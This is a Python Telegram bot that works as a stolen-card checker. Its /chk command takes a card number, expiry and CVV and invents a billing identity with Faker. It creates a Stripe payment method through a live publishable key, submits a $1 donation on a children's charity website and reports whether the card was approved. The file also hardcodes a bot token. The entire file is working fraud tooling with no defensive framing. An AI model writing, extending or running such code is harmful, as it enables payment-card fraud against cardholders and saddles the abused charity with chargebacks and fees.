import logging
import requests
import uuid
import random
from bs4 import BeautifulSoup
from faker import Faker
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext

# Setup Faker
faker = Faker('en_US')
guid = str(uuid.uuid4())
muid = str(uuid.uuid4())
sid = str(uuid.uuid4())
fakeName = faker.name()
fakeEmail = f"{faker.first_name().lower()}{random.randint(100000000, 999999999)}@gmail.com"
fakeZip = faker.zipcode()

# Function to escape special characters in MarkdownV2
def escape_markdown(text):
    return text.replace(".", "\.").replace("_", "\_").replace("*", "\*").replace("[", "\[").replace("]", "\]").replace("(", "\(").replace(")", "\)").replace("~", "\~").replace("`", "\`").replace(">", "\>").replace("#", "\#").replace("+", "\+").replace("-", "\-").replace("=", "\=").replace("|", "\|")

# Define the function to handle the /chk command
async def chk(update: Update, context: CallbackContext):
    # Ensure there's a proper input
    if len(context.args) != 1:
        await update.message.reply_text("❌ Please provide the card in the correct format: /chk cc|mm|yy|cvv")
        return
    
    # Extract card information
    card = context.args[0].split('|')
    if len(card) != 4:
        await update.message.reply_text("❌ Invalid card details format. Use: /chk <cc|mm|yy|cvv>")
        return

    cc = card[0]
    mes = card[1]
    ano = card[2]
    cvv = card[3]

    # Send "please wait" message
    waiting_message = await update.message.reply_text("⏳ Please wait while we check the card...")

    # Create a session and set headers for requests
    se = requests.Session()
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    }

    try:
        # Fetch page to get necessary form values
        html = se.get('https://needhelped.com/campaigns/poor-children-donation-4/donate/', headers=headers)
        charitable_session = se.cookies.get('charitable_session')
        soup = BeautifulSoup(html.text, 'html.parser')
        charitable_form_id = soup.find('input', {'name': 'charitable_form_id'})['value']
        charitable_donation_nonce = soup.find('input', {'name': '_charitable_donation_nonce'})['value']

        # Prepare data for Stripe API
        data = f'type=card&billing_details[name]={fakeName}&billing_details[email]={fakeEmail}&billing_details[address][city]=CONCORD&billing_details[address][country]=AU&billing_details[address][line1]=30+Sydney+Street&billing_details[address][postal_code]={fakeZip}&billing_details[address][state]=NSW&billing_details[phone]=0212+121+212&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&guid={guid}&muid={muid}&sid={sid}&payment_user_agent=stripe.js%2F1cb064bd1e%3B+stripe-js-v3%2F1cb064bd1e%3B+card-element&referrer=https%3A%2F%2Fneedhelped.com&time_on_page=1321663&key=pk_live_51NKtwILNTDFOlDwVRB3lpHRqBTXxbtZln3LM6TrNdKCYRmUuui6QwNFhDXwjF1FWDhr5BfsPvoCbAKlyP6Hv7ZIz00yKzos8Lr'
        response = se.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        id = response.json()['id']

        # Make donation request with stripe payment method
        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://needhelped.com',
            'priority': 'u=1, i',
            'referer': 'https://needhelped.com/campaigns/poor-children-donation-4/donate/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        data = {
            'charitable_form_id': charitable_form_id,
            f'{charitable_form_id}': '',
            '_charitable_donation_nonce': charitable_donation_nonce,
            '_wp_http_referer': '/campaigns/poor-children-donation-4/donate/',
            'campaign_id': '1164',
            'description': 'Poor Children Donation Support',
            'ID': '0',
            'donation_amount': 'custom',
            'custom_donation_amount': '1.00',
            'first_name': 'jyrgtfhyy',
            'last_name': 'tbrfgxcvb',
            'email': fakeEmail,
            'address': '30 Sydney Street',
            'address_2': '',
            'city': 'CONCORD',
            'state': 'NSW',
            'postcode': '2137',
            'country': 'AU',
            'phone': '0212 121 212',
            'gateway': 'stripe',
            'stripe_payment_method': id,
            'action': 'make_donation',
            'form_action': 'make_donation',
        }

        response = se.post('https://needhelped.com/wp-admin/admin-ajax.php', headers=headers, data=data)
        data = response.json()

        # Send final response after processing
        if data.get('success') is True:
            final_message = f"Card: `{escape_markdown(cc)}|{escape_markdown(mes)}|{escape_markdown(ano)}|{escape_markdown(cvv)} `\n✅ Donation approved: $1"
        else:
            error = data['errors'][0]
            final_message = f"Card: `{escape_markdown(cc)}|{escape_markdown(mes)}|{escape_markdown(ano)}|{escape_markdown(cvv)} `\n❌ Error: {escape_markdown(error)}"

        # Update "please wait" message with the final response
        await waiting_message.edit_text(final_message, parse_mode="MarkdownV2")
    
    except Exception as e:
        await waiting_message.edit_text(f"❌ An error occurred: {str(e)}", parse_mode="MarkdownV2")

# Setup the bot and handlers
def main():
    # Bot token provided
    bot_token = "8003309975:AAHoBOOwPDR6lRM4k8lhLzAeThqOwELoTM4"
    application = Application.builder().token(bot_token).build()

    # Add command handler
    application.add_handler(CommandHandler('chk', chk))

    # Start the bot
    application.run_polling()

if __name__ == '__main__':
    logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
    main()
